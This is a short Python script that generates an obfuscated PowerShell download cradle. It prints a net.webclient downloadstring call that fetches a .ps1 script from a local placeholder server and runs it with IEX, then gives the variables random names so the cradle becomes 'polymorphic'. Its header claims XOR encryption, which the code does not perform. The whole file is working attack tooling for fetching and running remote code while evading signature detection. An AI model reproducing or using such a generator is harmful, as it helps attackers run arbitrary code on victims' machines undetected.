#! /usr/bin/env python3 
################################################################################
##  Simple encryption with XOR
################################################################################

import random
import string

print('''	
################# Power$hell Code Routine we'd like to run  ####################
$var1 = "(new-object net.webclient)."
$var2 = "downloadstring"
$var3 = "('http://127.0.0.1:9999/test.ps1')"

$boom =  $var1 + $var2 + $var3
$boomboom =  IEX $boom

$boomboom | IEX
''')

def generate_random_string(length):
    letters_and_digits = string.ascii_uppercase + string.digits
    return ''.join(random.choices(letters_and_digits, k=length))


variables_dict = {
    "$var1": "(new-object net.webclient).",
    "$var2": "downloadstring",
    "$var3": "('http://127.0.0.1:9999/test.ps1')",
    "$boom": "$var1 + $var2 + $var3",
    "$boomboom": "IEX $boom"
}


new_vars_dict = {}
for var_name, var_value in variables_dict.items():
    if var_name.startswith("$"):
        new_var_name = generate_random_string(10)
        new_vars_dict[f'${new_var_name}'] = str(f'"{var_value}"')

# print('#################    First Iteration, Change the Cradle     ####################')
# for var_name, var_value in new_vars_dict.items():
#     print(f"{var_name} = {var_value}")

print('''
################      Woop Woop, we're polymorphic now      ####################''')
new_list = list(new_vars_dict)
new_vars_dict[f'{new_list[3]}'] = f'{new_list[0]} + {new_list[1]} + {new_list[2]}'
new_vars_dict[f'{new_list[4]}'] = f'IEX {new_list[3]}'
for var_name, var_value in new_vars_dict.items():
    print(f"{var_name} = {var_value}")

print(f'''
IEX {new_list[4]}''')
